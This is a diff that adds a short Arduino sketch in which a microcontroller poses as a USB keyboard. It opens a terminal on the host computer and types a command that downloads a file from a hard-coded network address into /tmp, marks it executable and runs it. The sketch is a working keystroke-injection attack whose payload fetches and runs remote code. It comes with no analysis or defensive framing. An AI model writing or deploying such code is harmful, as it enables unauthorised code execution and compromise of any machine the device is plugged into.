@@ -1,0 +1,33 @@
+#include <HIDKeyboard.h>
+
+HIDKeyboard keyboard;
+
+char *command="/bin/sh -c 'wget -O /tmp/x http://192.168.1.108/test && chmod +x /tmp/x && /tmp/x' ";
+
+void setup()
+{
+  keyboard.begin();
+  delay(200);
+}
+
+void loop()
+{
+  //keyboard.pressSpecialKey(ALT,F2);
+  //keyboard.releaseKey();
+  //delay(10);
+  
+  keyboard.pressSpecialKey(GUI);
+  keyboard.releaseKey();
+  delay(100);
+  keyboard.print("terminal");
+  delay(150);
+  keyboard.pressSpecialKey(ENTER);
+  keyboard.releaseKey();
+  delay(1500);
+  
+  keyboard.print(command);
+  keyboard.pressSpecialKey(ENTER);
+  keyboard.releaseKey();
+  delay(100);
+  while(1);
+}
